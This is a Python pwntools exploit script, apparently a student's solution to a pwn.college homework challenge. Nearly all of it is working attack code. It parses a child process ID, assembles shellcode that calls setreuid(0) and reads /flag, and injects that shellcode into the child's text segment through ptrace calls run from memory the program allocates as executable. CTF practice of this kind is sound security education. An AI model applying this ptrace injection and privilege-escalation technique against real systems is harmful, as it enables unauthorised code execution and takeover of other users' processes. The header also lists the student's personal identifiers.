# Name: Tanishq Javvaji
# Uid: 119070185
# pwn.college username: happy315
# Discord: @happy315 / Tanishq Javvaji

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template /challenge/homework
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/homework')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
set follow-fork parent
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

io = start()

io.recvuntil(b'\n')
io.sendline(b'2')
captured_output=io.recvuntil(b'Enter the command you want to do:').decode('utf-8')
# I'm using the python regular expression approach where r"Child PID = (\d+)" to capture number after "pid ="  until the next whitespace character or the end of the line
match=re.search(r"Child PID = (\d+)", captured_output)
if match:
	child_pid=match.group(1)
	print(child_pid)
else:
	print("Error Child PID not found")

write_address =  0x0000000000401853
#shellcode to escalate privileges and read the flag
shellcode = asm(
    shellcraft.setreuid(0) +  # using setreuid for privilege escalation
    shellcraft.cat('/flag')         
)
# Define constants for ptrace system calls.
ATTACH_PROCESS = 16
WRITE_TEXT_SEGMENT = 4
DETACH_PROCESS = 17

# Attach to the target process and wait for it to stop.
# Iterate through the shellcode, padding with NOPs and writing each chunk to the process's text segment.
# Detach from the process and enter an infinite loop to hold execution.
payload = shellcraft.ptrace(ATTACH_PROCESS, child_pid, 0, 0)
payload += shellcraft.wait4(child_pid)
# The loop iterates through the shellcode byte array, processing it in chunks of 8 bytes at a time. 
# It begins by initializing a loop counter i to zero. 
# While i is less than the length of the shellcode, the loop extracts a chunk of 8 bytes from the shellcode, pads it with NOP instructions if necessary to ensure it is exactly 8 bytes long, and then converts it into a single value. 
# This value is then incorporated into a payload for writing to the text segment of a child process, with the payload being appended to a variable named payload. 
# After each iteration, the loop counter i is incremented by 8 to move to the next chunk of bytes in the shellcode. 
# This process continues until the entire shellcode has been processed.
i = 0  
while i < len(shellcode):
    chunk_bytes = bytearray(shellcode[i:i+8])
    chunk_bytes.extend(b'\x90' * (8 - len(chunk_bytes)))
    chunk = bytes(chunk_bytes)  # Pad with NOPs
    data = struct.unpack("<Q", chunk)[0]
    payload += shellcraft.ptrace(WRITE_TEXT_SEGMENT, child_pid, write_address+i, data)
    i += 8  

payload += shellcraft.ptrace(DETACH_PROCESS, child_pid, 0, 0)
payload += shellcraft.infloop()

# Continue executing the program   
io.recvuntil(b'\n')
io.sendline(b'1')
io.recvuntil(b'How big do you want your memory to be?')
# Allocated 1048 bytes of memory, we can allocate the memory size based on our payload size.
io.sendline(b'1048')
io.recvuntil(b'What permissions would you like for the memory?')
io.sendline(b'7')
io.recvuntil(b'What do you want to include?\n')
io.sendline(asm(payload))
#print(payload)
buffer_addr = io.recvuntil(b'\n').split(b' ')[4].split(b'\n')[0].strip()
io.sendline(b'3')
io.recvline()
io.sendline(buffer_addr)

io.interactive()

